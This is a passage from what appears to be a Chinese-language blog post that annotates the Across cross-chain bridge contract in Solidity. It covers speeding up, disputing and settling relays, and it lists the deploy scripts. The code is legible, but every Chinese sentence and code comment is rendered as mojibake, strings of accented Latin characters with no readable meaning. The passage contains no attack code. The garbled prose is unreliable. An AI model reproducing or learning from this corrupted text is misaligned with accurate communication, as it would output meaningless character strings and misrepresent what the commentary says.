å¦ä¸€æ–¹é¢ï¼Œå¦‚æœå­˜æ¬¾æ•°æ®æ˜¯æœ‰æ•ˆçš„ï¼Œé‚£ä¹ˆå³ä½¿å®ƒè¢«é”™è¯¯åœ°äº‰è®®ï¼Œå³æ—¶ä¸­ç»§è€…æœ€ç»ˆä¹Ÿä¼šå¾—åˆ°è¡¥å¿ï¼Œ</span><br><span class="line">// å› ä¸ºä¼šæ¿€åŠ±å…¶ä»–äººé‡æ–°æäº¤ä¸­ç»§ï¼Œä»¥è·å¾—æ…¢ä¸­ç»§è€…çš„å¥–åŠ±ã€‚</span><br><span class="line">// ä¸€æ—¦æœ‰æ•ˆä¸­ç»§æœ€ç»ˆç¡®å®šï¼Œå³æ—¶ä¸­ç»§å°†å¾—åˆ°è¡¥å¿ã€‚å› æ­¤ï¼Œè°ƒç”¨è€…åœ¨éªŒè¯ä¸­ç»§æ•°æ®æ–¹é¢ä¸äº‰è®®è€…å…·æœ‰ç›¸åŒçš„è´£ä»»ã€‚</span><br><span class="line">function speedUpRelay(DepositData memory depositData, RelayData memory relayData) public nonReentrant() &#123;</span><br><span class="line">      bytes32 depositHash = _getDepositHash(depositData);</span><br><span class="line">      _validateRelayDataHash(depositHash, relayData);</span><br><span class="line">      bytes32 instantRelayHash = _getInstantRelayHash(depositHash, relayData);</span><br><span class="line">      require(</span><br><span class="line">          // åªèƒ½åœ¨æ²¡æœ‰ä¸ä¹‹å…³è”çš„ç°æœ‰å³æ—¶ä¸­ç»§çš„æƒ…å†µä¸‹åŠ é€Ÿå¾…å¤„ç†çš„ä¸­ç»§ã€‚</span><br><span class="line">          getCurrentTime() &lt; relayData.priceRequestTime + optimisticOracleLiveness &amp;&amp;</span><br><span class="line">              relayData.relayState == RelayState.Pending &amp;&amp;</span><br><span class="line">              instantRelays[instantRelayHash] == address(0),</span><br><span class="line">          &quot;Relay cannot be sped up&quot;</span><br><span class="line">      );</span><br><span class="line">      instantRelays[instantRelayHash] = msg.sender;</span><br><span class="line"></span><br><span class="line">      // ä»è°ƒç”¨è€…é‚£é‡Œæå–ä¸­ç»§é‡‘é¢å‡å»è´¹ç”¨å¹¶å‘é€å­˜æ¬¾åˆ° l1Recipientã€‚</span><br><span class="line">// æ”¯ä»˜çš„æ€»è´¹ç”¨æ˜¯ LP è´¹ç”¨ã€ä¸­ç»§è´¹ç”¨å’Œå³æ—¶ä¸­ç»§è´¹ç”¨çš„æ€»å’Œã€‚</span><br><span class="line">      uint256 feesTotal =</span><br><span class="line">          _getAmountFromPct(</span><br><span class="line">              relayData.realizedLpFeePct + depositData.slowRelayFeePct + depositData.instantRelayFeePct,</span><br><span class="line">              depositData.amount</span><br><span class="line">          );</span><br><span class="line">      // å¦‚æœ L1 ä»£å¸æ˜¯ WETHï¼Œé‚£ä¹ˆï¼ša) ä»å³æ—¶ä¸­ç»§è€…æå– WETH b) è§£åŒ… WETH ä¸º ETH c) å°† ETH å‘é€ç»™æ¥æ”¶è€…ã€‚</span><br><span class="line">      uint256 recipientAmount = depositData.amount - feesTotal;</span><br><span class="line">      if (isWethPool) &#123;</span><br><span class="line">          l1Token.safeTransferFrom(msg.sender, address(this), recipientAmount);</span><br><span class="line">          _unwrapWETHTo(depositData.l1Recipient, recipientAmount);</span><br><span class="line">          // å¦åˆ™ï¼Œè¿™æ˜¯ä¸€ä¸ªæ™®é€šçš„ ERC20 ä»£å¸ã€‚ å‘é€ç»™æ”¶ä»¶äººã€‚</span><br><span class="line">      &#125; else l1Token.safeTransferFrom(msg.sender, depositData.l1Recipient, recipientAmount);</span><br><span class="line"></span><br><span class="line">      emit RelaySpedUp(depositHash, msg.sender, relayData);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3><span id="ji-shi-zhong-ji">å³æ—¶ä¸­ç»§</span></h3><p><code>relayAndSpeedUp</code> æ‰§è¡Œå³æ—¶ä¸­ç»§ã€‚è¿™ä¸ªæ–¹æ³•çš„å‡½æ•°å†…å®¹ä¸ <code>relayDeposit</code> å’Œ <code>speedUpRelay</code> æ–¹æ³•æ˜¯ä¸€è‡´çš„ï¼Œè¿™é‡Œå°±ä¸å…·ä½“æ³¨é‡Šäº†ï¼Œå¯ä»¥å‚è€ƒå‰æ–‡ä¸­çš„æ³¨é‡Šã€‚è¿™ä¸ªå‡½æ•°çš„ä»£ç å‡ ä¹æ˜¯ç›´æ¥å°† <code>relayDeposit</code> å’Œ <code>speedUpRelay</code> çš„ä»£ç è¿›è¡Œäº†åˆå¹¶ï¼Œä»£ç å†—ä½™ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  // ç”± Relayer è°ƒç”¨ä»¥æ‰§è¡Œä» L2 åˆ° L1 çš„æ…¢ + å¿«ä¸­ç»§ï¼Œå®Œæˆç›¸åº”çš„å­˜æ¬¾è®¢å•ã€‚</span><br><span class="line">  // å­˜æ¬¾åªèƒ½æœ‰ä¸€ä¸ªå¾…å¤„ç†çš„ä¸­ç»§ã€‚æ­¤æ–¹æ³•å®é™…ä¸Šæ˜¯ä¸²è”çš„ relayDeposit å’Œ speedUpRelay æ–¹æ³•ã€‚</span><br><span class="line">// è¿™å¯ä»¥é‡æ„ä¸ºåªè°ƒç”¨æ¯ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯ç»“åˆä¼ è¾“å’Œå“ˆå¸Œè®¡ç®—å¯ä»¥èŠ‚çœä¸€äº› gasã€‚</span><br><span class="line">function relayAndSpeedUp(DepositData memory depositData, uint64 realizedLpFeePct)</span><br><span class="line">      public</span><br><span class="line">      onlyIfRelaysEnabld()</span><br><span class="line">      nonReentrant()</span><br><span class="line">  &#123;</span><br><span class="line">      uint32 priceRequestTime = uint32(getCurrentTime());</span><br><span class="line"></span><br><span class="line">      require(</span><br><span class="line">          depositData.slowRelayFeePct &lt;= 0.25e18 &amp;&amp;</span><br><span class="line">              depositData.instantRelayFeePct &lt;= 0.25e18 &amp;&amp;</span><br><span class="line">              realizedLpFeePct &lt;= 0.5e18,</span><br><span class="line">          &quot;Invalid fees&quot;</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      bytes32 depositHash = _getDepositHash(depositData);</span><br><span class="line"></span><br><span class="line">      require(relays[depositHash] == bytes32(0), &quot;Pending relay exists&quot;);</span><br><span class="line"></span><br><span class="line">      uint256 proposerBond = _getProposerBond(depositData.amount);</span><br><span class="line"></span><br><span class="line">      RelayData memory relayData =</span><br><span class="line">          RelayData(&#123;</span><br><span class="line">              relayState: RelayState.Pending,</span><br><span class="line">              slowRelayer: msg.sender,</span><br><span class="line">              relayId: numberOfRelays++, // Note: Increment numberOfRelays at the same time as setting relayId to its current value.</span><br><span class="line">              realizedLpFeePct: realizedLpFeePct,</span><br><span class="line">              priceRequestTime: priceRequestTime,</span><br><span class="line">              proposerBond: proposerBond,</span><br><span class="line">              finalFee: l1TokenFinalFee</span><br><span class="line">          &#125;);</span><br><span class="line">      bytes32 relayHash = _getRelayHash(depositData, relayData);</span><br><span class="line">      relays[depositHash] = _getRelayDataHash(relayData);</span><br><span class="line"></span><br><span class="line">      bytes32 instantRelayHash = _getInstantRelayHash(depositHash, relayData);</span><br><span class="line">      require(</span><br><span class="line">          instantRelays[instantRelayHash] == address(0),</span><br><span class="line">          &quot;Relay cannot be sped up&quot;</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      require(liquidReserves - pendingReserves &gt;= depositData.amount, &quot;Insufficient pool balance&quot;);</span><br><span class="line"></span><br><span class="line">      uint256 totalBond = proposerBond + l1TokenFinalFee;</span><br><span class="line"></span><br><span class="line">      uint256 feesTotal =</span><br><span class="line">          _getAmountFromPct(</span><br><span class="line">              relayData.realizedLpFeePct + depositData.slowRelayFeePct + depositData.instantRelayFeePct,</span><br><span class="line">              depositData.amount</span><br><span class="line">          );</span><br><span class="line">      uint256 recipientAmount = depositData.amount - feesTotal;</span><br><span class="line"></span><br><span class="line">      bonds += totalBond;</span><br><span class="line">      pendingReserves += depositData.amount;</span><br><span class="line"></span><br><span class="line">      instantRelays[instantRelayHash] = msg.sender;</span><br><span class="line"></span><br><span class="line">      l1Token.safeTransferFrom(msg.sender, address(this), recipientAmount + totalBond);</span><br><span class="line"></span><br><span class="line">      if (isWethPool) &#123;</span><br><span class="line">          _unwrapWETHTo(depositData.l1Recipient, recipientAmount);</span><br><span class="line">      &#125; else l1Token.safeTransfer(depositData.l1Recipient, recipientAmount);</span><br><span class="line"></span><br><span class="line">      emit DepositRelayed(depositHash, depositData, relayData, relayHash);</span><br><span class="line">      emit RelaySpedUp(depositHash, msg.sender, relayData);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3><span id="zheng-yi">äº‰è®®</span></h3><p>å½“å¯¹å¾…å¤„ç†çš„ä¸­ç»§æå‡ºäº‰è®®æ—¶ï¼Œäº‰è®®è€…éœ€è¦æƒ³ Optimistic Oracle æäº¤ææ¡ˆï¼Œå¹¶ç­‰å¾…äº‰è®®è§£å†³ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  // ç”± Disputer è°ƒç”¨ä»¥å¯¹å¾…å¤„ç†çš„ä¸­ç»§æå‡ºäº‰è®®ã€‚</span><br><span class="line">// è¿™ä¸ªæ–¹æ³•çš„ç»“æœæ˜¯æ€»æ˜¯æŠ›å‡ºä¸­ç»§ï¼Œä¸ºå¦ä¸€ä¸ªä¸­ç»§è€…æä¾›å¤„ç†ç›¸åŒå­˜æ¬¾çš„æœºä¼šã€‚</span><br><span class="line">// åœ¨äº‰è®®è€…å’Œæè®®è€…ä¹‹é—´ï¼Œè°ä¸æ­£ç¡®ï¼Œè°å°±å¤±å»äº†ä»–ä»¬çš„è´¨æŠ¼ã€‚è°æ˜¯æ­£ç¡®çš„ï¼Œè°å°±æ‹¿å›æ¥å¹¶è·å¾—ä¸€ç¬”é’±ã€‚</span><br><span class="line">function disputeRelay(DepositData memory depositData, RelayData memory relayData) public nonReentrant() &#123;</span><br><span class="line">      require(relayData.priceRequestTime + optimisticOracleLiveness &gt; getCurrentTime(), &quot;Past liveness&quot;);</span><br><span class="line">      require(relayData.relayState == RelayState.Pending, &quot;Not disputable&quot;);</span><br><span class="line">      // æ£€éªŒè¾“å…¥æ•°æ®</span><br><span class="line">      bytes32 depositHash = _getDepositHash(depositData);</span><br><span class="line">      _validateRelayDataHash(depositHash, relayData);</span><br><span class="line"></span><br><span class="line">      // å°†ææ¡ˆå’Œäº‰è®®æäº¤ç»™ Optimistic Oracleã€‚</span><br><span class="line">      bytes32 relayHash = _getRelayHash(depositData, relayData);</span><br><span class="line"></span><br><span class="line">      // æ³¨æ„ï¼šåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œè¿™ä¼šç”±äº Optimistic Oracle çš„å˜åŒ–è€Œå¤±è´¥ï¼Œå¹¶ä¸”è¯¥æ–¹æ³•å°†é€€è¿˜ä¸­ç»§è€…ã€‚</span><br><span class="line">      bool success =</span><br><span class="line">          _requestProposeDispute(</span><br><span class="line">              relayData.slowRelayer,</span><br><span class="line">              msg.sender,</span><br><span class="line">              relayData.proposerBond,</span><br><span class="line">              relayData.finalFee,</span><br><span class="line">              _getRelayAncillaryData(relayHash)</span><br><span class="line">          );</span><br><span class="line"></span><br><span class="line">// æ”¾å¼ƒä¸­ç»§å¹¶ä»è·Ÿè¸ªçš„ä¿è¯é‡‘ä¸­ç§»é™¤ä¸­ç»§çš„ä¿è¯é‡‘ã€‚</span><br><span class="line">      bonds -= relayData.finalFee + relayData.proposerBond;</span><br><span class="line">      pendingReserves -= depositData.amount;</span><br><span class="line">      delete relays[depositHash];</span><br><span class="line">      if (success) emit RelayDisputed(depositHash, _getRelayDataHash(relayData), msg.sender);</span><br><span class="line">      else emit RelayCanceled(depositHash, _getRelayDataHash(relayData), msg.sender);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ <code>_requestProposeDispute</code> çš„å‡½æ•°å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  // å‘ optimistic oracle æè®®ä¸ `customAncillaryData` ç›¸å…³çš„ä¸­ç»§äº‹ä»¶çš„æ–°ä»·æ ¼ä¸ºçœŸã€‚</span><br><span class="line">// å¦‚æœæœ‰äººä¸åŒæ„ä¸­ç»§å‚æ•°ï¼Œä¸ç®¡ä»–ä»¬æ˜¯å¦æ˜ å°„åˆ° L2 å­˜æ¬¾ï¼Œä»–ä»¬å¯ä»¥ä¸é¢„è¨€æœºäº‰è®®ã€‚</span><br><span class="line">  function _requestProposeDispute(</span><br><span class="line">      address proposer,</span><br><span class="line">      address disputer,</span><br><span class="line">      uint256 proposerBond,</span><br><span class="line">      uint256 finalFee,</span><br><span class="line">      bytes memory customAncillaryData</span><br><span class="line">  ) private returns (bool) &#123;</span><br><span class="line">      uint256 totalBond = finalFee + proposerBond;</span><br><span class="line">      l1Token.safeApprove(address(optimisticOracle), totalBond);</span><br><span class="line">      try</span><br><span class="line">          optimisticOracle.requestAndProposePriceFor(</span><br><span class="line">              identifier,</span><br><span class="line">              uint32(getCurrentTime()),</span><br><span class="line">              customAncillaryData,</span><br><span class="line">              IERC20(l1Token),</span><br><span class="line">              // å°†å¥–åŠ±è®¾ç½®ä¸º 0ï¼Œå› ä¸ºåœ¨ä¸­ç»§ææ¡ˆç»è¿‡æŒ‘æˆ˜æœŸåï¼Œæˆ‘ä»¬å°†ç›´æ¥ä»è¯¥åˆçº¦ä¸­ç»“ç®—ææ¡ˆäººå¥–åŠ±æ”¯å‡ºã€‚</span><br><span class="line">              0,</span><br><span class="line">              // ä¸ºä»·æ ¼è¯·æ±‚è®¾ç½® Optimistic oracle æè®®è€…ä¿è¯é‡‘ã€‚</span><br><span class="line">              proposerBond,</span><br><span class="line">              // ä¸ºä»·æ ¼è¯·æ±‚è®¾ç½® Optimistic oracle æ´»è·ƒæ—¶é—´ã€‚</span><br><span class="line">              optimisticOracleLiveness,</span><br><span class="line">              proposer,</span><br><span class="line">              // è¡¨ç¤º &quot;True&quot;; åŠæè®®çš„ä¸­ç»§æ˜¯åˆæ³•çš„</span><br><span class="line">              int256(1e18)</span><br><span class="line">          )</span><br><span class="line">      returns (uint256 bondSpent) &#123;</span><br><span class="line">          if (bondSpent &lt; totalBond) &#123;</span><br><span class="line">              // å¦‚æœ Optimistic oracle æ‹‰å–å¾—æ›´å°‘ï¼ˆç”±äºæœ€ç»ˆè´¹ç”¨çš„å˜åŒ–ï¼‰ï¼Œåˆ™é€€è¿˜æè®®è€…ã€‚</span><br><span class="line">              uint256 refund = totalBond - bondSpent;</span><br><span class="line">              l1Token.safeTransfer(proposer, refund);</span><br><span class="line">              l1Token.safeApprove(address(optimisticOracle), 0);</span><br><span class="line">              totalBond = bondSpent;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; catch &#123;</span><br><span class="line">          // å¦‚æœ Optimistic oracle ä¸­å‡ºç°é”™è¯¯ï¼Œè¿™æ„å‘³ç€å·²ç»æ›´æ”¹äº†æŸäº›å†…å®¹ä»¥ä½¿è¯¥è¯·æ±‚æ— å¯äº‰è®®ã€‚</span><br><span class="line">// ä¸ºç¡®ä¿è¯·æ±‚ä¸ä¼šé»˜è®¤é€šè¿‡ï¼Œé€€æ¬¾æè®®è€…å¹¶æå‰è¿”å›ï¼Œå…è®¸è°ƒç”¨æ–¹æ³•åˆ é™¤è¯·æ±‚ï¼Œä½† Optimistic oracle æ²¡æœ‰é¢å¤–çš„è¿½ç´¢æƒã€‚</span><br><span class="line">          l1Token.safeTransfer(proposer, totalBond);</span><br><span class="line">          l1Token.safeApprove(address(optimisticOracle), 0);</span><br><span class="line"></span><br><span class="line">          // ææ—©è¿”å›ï¼Œæ³¨æ„åˆ°ææ¡ˆ+äº‰è®®çš„å°è¯•æ²¡æœ‰æˆåŠŸã€‚</span><br><span class="line">          return false;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      SkinnyOptimisticOracleInterface.Request memory request =</span><br><span class="line">          SkinnyOptimisticOracleInterface.Request(&#123;</span><br><span class="line">              proposer: proposer,</span><br><span class="line">              disputer: address(0),</span><br><span class="line">              currency: IERC20(l1Token),</span><br><span class="line">              settled: false,</span><br><span class="line">              proposedPrice: int256(1e18),</span><br><span class="line">              resolvedPrice: 0,</span><br><span class="line">              expirationTime: getCurrentTime() + optimisticOracleLiveness,</span><br><span class="line">              reward: 0,</span><br><span class="line">              finalFee: totalBond - proposerBond,</span><br><span class="line">              bond: proposerBond,</span><br><span class="line">              customLiveness: uint256(optimisticOracleLiveness)</span><br><span class="line">          &#125;);</span><br><span class="line"></span><br><span class="line">      // æ³¨æ„ï¼šåœ¨æ­¤ä¹‹å‰ä¸è¦æå–èµ„é‡‘ï¼Œä»¥é¿å…ä»»ä½•ä¸éœ€è¦çš„è½¬è´¦ã€‚</span><br><span class="line">      l1Token.safeTransferFrom(msg.sender, address(this), totalBond);</span><br><span class="line">      l1Token.safeApprove(address(optimisticOracle), totalBond);</span><br><span class="line">      // å¯¹æˆ‘ä»¬åˆšåˆšå‘é€çš„è¯·æ±‚æå‡ºäº‰è®®ã€‚</span><br><span class="line">      optimisticOracle.disputePriceFor(</span><br><span class="line">          identifier,</span><br><span class="line">          uint32(getCurrentTime()),</span><br><span class="line">          customAncillaryData,</span><br><span class="line">          request,</span><br><span class="line">          disputer,</span><br><span class="line">          address(this)</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      // è¿”å› true è¡¨ç¤ºææ¡ˆ + äº‰è®®è°ƒç”¨æˆåŠŸã€‚</span><br><span class="line">      return true;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ <code>settleRelay</code>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  // å¦‚æœå¾…å¤„ç†ä¸­ç»§ä»·æ ¼è¯·æ±‚åœ¨ OptimisticOracle ä¸Šæœ‰å¯ç”¨çš„ä»·æ ¼ï¼Œåˆ™å¥–åŠ±ä¸­ç»§è€…ï¼Œå¹¶å°†ä¸­ç»§æ ‡è®°ä¸ºå®Œæˆã€‚</span><br><span class="line"> // æˆ‘ä»¬ä½¿ç”¨ relayData å’Œ depositData æ¥è®¡ç®—ä¸­ç»§ä»·æ ¼è¯·æ±‚åœ¨ OptimisticOracle ä¸Šå”¯ä¸€å…³è”çš„è¾…åŠ©æ•°æ®ã€‚</span><br><span class="line">// å¦‚æœä¼ å…¥çš„ä»·æ ¼è¯·æ±‚ä¸å¾…å¤„ç†çš„ä¸­ç»§ä»·æ ¼è¯·æ±‚ä¸åŒ¹é…ï¼Œé‚£ä¹ˆè¿™å°†æ¢å¤(revert)ã€‚</span><br><span class="line">function settleRelay(DepositData memory depositData, RelayData memory relayData) public nonReentrant() &#123;</span><br><span class="line">      bytes32 depositHash = _getDepositHash(depositData);</span><br><span class="line">      _validateRelayDataHash(depositHash, relayData);</span><br><span class="line">      require(relayData.relayState == RelayState.Pending, &quot;Already settled&quot;);</span><br><span class="line">      uint32 expirationTime = relayData.priceRequestTime + optimisticOracleLiveness;</span><br><span class="line">      require(expirationTime &lt;= getCurrentTime(), &quot;Not settleable yet&quot;);</span><br><span class="line"></span><br><span class="line">      // æ³¨æ„ï¼šæ­¤æ£€æŸ¥æ˜¯ä¸ºäº†ç»™ä¸­ç»§è€…ä¸€å°æ®µä½†åˆç†çš„æ—¶é—´æ¥å®Œæˆä¸­ç»§ï¼Œç„¶åå†è¢«å…¶ä»–äººâ€œå·èµ°â€ã€‚</span><br><span class="line">// è¿™æ˜¯ä¸ºäº†ç¡®ä¿æœ‰åŠ¨åŠ›å¿«é€Ÿè§£å†³ä¸­ç»§ã€‚</span><br><span class="line">      require(</span><br><span class="line">          msg.sender == relayData.slowRelayer || getCurrentTime() &gt; expirationTime + 15 minutes,</span><br><span class="line">          &quot;Not slow relayer&quot;</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      // å°†ä¸­ç»§çŠ¶æ€æ›´æ–°ä¸ºå·²å®Œæˆã€‚ è¿™å¯ä»¥é˜²æ­¢ä¸­ç»§çš„ä»»ä½•é‡æ–°è®¾å¤„ç†ã€‚</span><br><span class="line">      relays[depositHash] = _getRelayDataHash(</span><br><span class="line">          RelayData(&#123;</span><br><span class="line">              relayState: RelayState.Finalized,</span><br><span class="line">              slowRelayer: relayData.slowRelayer,</span><br><span class="line">              relayId: relayData.relayId,</span><br><span class="line">              realizedLpFeePct: relayData.realizedLpFeePct,</span><br><span class="line">              priceRequestTime: relayData.priceRequestTime,</span><br><span class="line">              proposerBond: relayData.proposerBond,</span><br><span class="line">              finalFee: relayData.finalFee</span><br><span class="line">          &#125;)</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      // å¥–åŠ±ä¸­ç»§è€…å¹¶æ”¯ä»˜ l1Recipientã€‚</span><br><span class="line">       // æ­¤æ—¶æœ‰ä¸¤ç§å¯èƒ½çš„æƒ…å†µï¼š</span><br><span class="line">       // - è¿™æ˜¯ä¸€ä¸ªæ…¢é€Ÿä¸­ç»§ï¼šåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œa) å‘æ…¢é€Ÿä¸­ç»§è€…æ”¯ä»˜å¥–åŠ± b) å‘ l1Recipient æ”¯ä»˜</span><br><span class="line">       //   é‡‘é¢å‡å»å·²å®ç°çš„ LP è´¹ç”¨å’Œæ…¢é€Ÿä¸­ç»§è´¹ç”¨ã€‚ è½¬è´¦æ²¡æœ‰åŠ å¿«ï¼Œæ‰€ä»¥æ²¡æœ‰å³æ—¶è´¹ç”¨ã€‚</span><br><span class="line">       // - è¿™æ˜¯ä¸€ä¸ªå³æ—¶ä¸­ç»§ï¼šåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œa) å‘æ…¢é€Ÿä¸­ç»§è€…æ”¯ä»˜å¥–åŠ± b) å‘å³æ—¶ä¸­ç»§è€…æ”¯ä»˜</span><br><span class="line">       //   å…¨éƒ¨æ¡¥æ¥é‡‘é¢ï¼Œå‡å»å·²å®ç°çš„ LP è´¹ç”¨å¹¶å‡å»æ…¢é€Ÿä¸­ç»§è´¹ç”¨ã€‚</span><br><span class="line">//    å½“å³æ—¶ä¸­ç»§è€…è°ƒç”¨ speedUpRelay æ—¶ï¼Œå®ƒä»¬å­˜å…¥çš„é‡‘é¢ç›¸åŒï¼Œå‡å»å³æ—¶ä¸­ç»§è€…è´¹ç”¨ã€‚</span><br><span class="line">//    ç»“æœï¼Œä»–ä»¬å®é™…ä¸Šå¾—åˆ°äº†åŠ é€Ÿä¸­ç»§æ—¶æ‰€èŠ±è´¹çš„è´¹ç”¨ + InstantRelayFeeã€‚</span><br><span class="line"></span><br><span class="line">      uint256 instantRelayerOrRecipientAmount =</span><br><span class="line">          depositData.amount -</span><br><span class="line">              _getAmountFromPct(relayData.realizedLpFeePct + depositData.slowRelayFeePct, depositData.amount);</span><br><span class="line"></span><br><span class="line">      // å¦‚æœå³æ—¶ä¸­ç»§å‚æ•°ä¸æ‰¹å‡†çš„ä¸­ç»§ç›¸åŒ¹é…ï¼Œåˆ™é€€æ¬¾ç»™å³æ—¶ä¸­ç»§è€…ã€‚</span><br><span class="line">      bytes32 instantRelayHash = _getInstantRelayHash(depositHash, relayData);</span><br><span class="line">      address instantRelayer = instantRelays[instantRelayHash];</span><br><span class="line"></span><br><span class="line">      // å¦‚æœè¿™æ˜¯ WETH æ± å¹¶ä¸”å³æ—¶ä¸­ç»§è€…æ˜¯åœ°å€ 0x0ï¼ˆå³ä¸­ç»§æ²¡æœ‰åŠ é€Ÿï¼‰ï¼Œé‚£ä¹ˆï¼š</span><br><span class="line">      // a) å°† WETH æå–åˆ° ETH å’Œ b) å°† ETH å‘é€ç»™æ¥æ”¶è€…ã€‚</span><br><span class="line">      if (isWethPool &amp;&amp; instantRelayer == address(0)) &#123;</span><br><span class="line">          _unwrapWETHTo(depositData.l1Recipient, instantRelayerOrRecipientAmount);</span><br><span class="line">          // å¦åˆ™ï¼Œè¿™æ˜¯ä¸€ä¸ªæ­£å¸¸çš„æ…¢é€Ÿä¸­ç»§æ­£åœ¨å®Œæˆï¼Œåˆçº¦å°† ERC20 å‘é€ç»™æ¥æ”¶è€…ï¼Œ</span><br><span class="line">// æˆ–è€…è¿™æ˜¯ä¸€ä¸ªå³æ—¶ä¸­ç»§çš„æœ€ç»ˆå®Œæˆï¼Œæˆ‘ä»¬éœ€è¦ç”¨ WETH å¿è¿˜å³æ—¶ä¸­ç»§è€…ã€‚</span><br><span class="line">      &#125; else</span><br><span class="line">          l1Token.safeTransfer(</span><br><span class="line">              instantRelayer != address(0) ? instantRelayer : depositData.l1Recipient,</span><br><span class="line">              instantRelayerOrRecipientAmount</span><br><span class="line">          );</span><br><span class="line"></span><br><span class="line">      // éœ€è¦æ”¯ä»˜è´¹ç”¨å’Œä¿è¯é‡‘ã€‚è´¹ç”¨å½’è§£å†³è€…ã€‚ä¿è¯é‡‘æ€»æ˜¯å½’åˆ°æ…¢é€Ÿä¸­ç»§è€…ã€‚</span><br><span class="line">      // æ³¨æ„ï¼šä¸ºäº† gas æ•ˆç‡ï¼Œæˆ‘ä»¬ä½¿ç”¨ `if`ï¼Œæ‰€ä»¥å¦‚æœå®ƒä»¬æ˜¯ç›¸åŒçš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åˆå¹¶è¿™äº›è½¬è´¦ã€‚</span><br><span class="line">      uint256 slowRelayerReward = _getAmountFromPct(depositData.slowRelayFeePct, depositData.amount);</span><br><span class="line">      uint256 totalBond = relayData.finalFee + relayData.proposerBond;</span><br><span class="line">      if (relayData.slowRelayer == msg.sender)</span><br><span class="line">          l1Token.safeTransfer(relayData.slowRelayer, slowRelayerReward + totalBond);</span><br><span class="line">      else &#123;</span><br><span class="line">          l1Token.safeTransfer(relayData.slowRelayer, totalBond);</span><br><span class="line">          l1Token.safeTransfer(msg.sender, slowRelayerReward);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      uint256 totalReservesSent = instantRelayerOrRecipientAmount + slowRelayerReward;</span><br><span class="line"></span><br><span class="line">      // æŒ‰æ›´æ”¹çš„é‡‘é¢å’Œåˆ†é…çš„ LP è´¹ç”¨æ›´æ–°å‚¨å¤‡ã€‚</span><br><span class="line">      pendingReserves -= depositData.amount;</span><br><span class="line">      liquidReserves -= totalReservesSent;</span><br><span class="line">      utilizedReserves += int256(totalReservesSent);</span><br><span class="line">      bonds -= totalBond;</span><br><span class="line">      _updateAccumulatedLpFees();</span><br><span class="line">      _allocateLpFees(_getAmountFromPct(relayData.realizedLpFeePct, depositData.amount));</span><br><span class="line"></span><br><span class="line">      emit RelaySettled(depositHash, msg.sender, relayData);</span><br><span class="line"></span><br><span class="line">      // æ¸…ç†çŠ¶æ€å­˜å‚¨å¹¶è·å¾—gasé€€æ¬¾ã€‚</span><br><span class="line">// è¿™ä¹Ÿå¯ä»¥é˜²æ­¢ `priceDisputed()` é‡ç½®è¿™ä¸ªæ–°çš„ Finalized ä¸­ç»§çŠ¶æ€ã€‚</span><br><span class="line">      delete instantRelays[instantRelayHash];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _allocateLpFees(uint256 allocatedLpFees) internal &#123;</span><br><span class="line">      undistributedLpFees += allocatedLpFees;</span><br><span class="line">      utilizedReserves += int256(allocatedLpFees);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œæˆ‘ä»¬åˆ†æå®Œäº† Across åˆçº¦çš„ä¸»è¦åŠŸèƒ½çš„ä»£ç ã€‚</p><h2><span id="he-yue-bu-shu">åˆçº¦éƒ¨ç½²</span></h2><p>éƒ¨ç½²åˆçº¦ç›®å½• <code>deploy</code> ä¸‹åŒ…å« 8 è„šæœ¬ï¼Œä¾æ¬¡éƒ¨ç½²äº†ç®¡ç†åˆçº¦ï¼ŒWETH æ¡¥æ¥æ± ï¼ŒOptimismï¼ŒArbitrumå’ŒBobaçš„ä¿¡ä½¿ï¼Œä»¥åŠ Arbitrumï¼ŒOptimism å’Œ Boba çš„å­˜æ¬¾åˆçº¦ã€‚ç”±äºè¿‡ç¨‹æ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œå°±ä¸ä»”ç»†åˆ†æäº†ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deploy/</span><br><span class="line">â”œâ”€â”€ 001_deploy_across_bridge_admin.js</span><br><span class="line">â”œâ”€â”€ 002_deploy_across_weth_bridge_pool.js</span><br><span class="line">â”œâ”€â”€ 003_deploy_across_optimism_wrapper.js</span><br><span class="line">â”œâ”€â”€ 004_deploy_across_optimism_messenger.js</span><br><span class="line">â”œâ”€â”€ 005_deploy_across_arbitrum_messenger.js</span><br><span class="line">â”œâ”€â”€ 006_deploy_across_boba_messenger.js</span><br><span class="line">â”œâ”€â”€ 007_deploy_across_ovm_bridge_deposit_box.js</span><br><span class="line">â””â”€â”€ 008_deploy_across_avm_deposit_box.js</span><br></pre></td></tr></table></figure><h2><span id="zong-jie">æ€»ç»“</span></h2><p>Across åè®®æ•´ä½“ç»“æ„ç®€å•ï¼Œæµç¨‹æ¸…æ™°ï¼Œæ”¯æŒäº† Across åè®®å®‰å…¨ï¼Œå¿«é€Ÿçš„ä» L2 å‘ L1 çš„èµ„é‡‘è½¬ç§»ã€‚</p><p>ä»£ç ä¸­è°ƒç”¨äº† Optimistic Oracle 